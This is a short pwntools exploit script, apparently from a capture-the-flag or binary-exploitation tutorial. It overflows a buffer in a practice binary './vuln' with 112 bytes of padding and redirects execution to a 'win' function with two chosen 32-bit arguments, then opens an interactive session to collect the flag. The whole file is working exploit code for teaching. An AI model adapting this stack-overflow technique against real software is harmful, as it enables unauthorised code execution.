from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()
padding = 112

payload = flat({
    padding: [
        # 32-bit the params follow the function
        elf.functions.win,
        0x0,  # Return pointer - try changing to main() and step through with GDB!
        0xCAFEF00D,  # Param_1
        0xF00DF00D,  # Param_2
    ]
})


# payload = padding + p32(elf.symbols.win) + p32(0xF00DF00D) + p32(0xCAFEF00D) 
# Save the payload to file
write('payload', payload)
# Send the payload
io.sendline(payload)
# Receive the flag
io.interactive()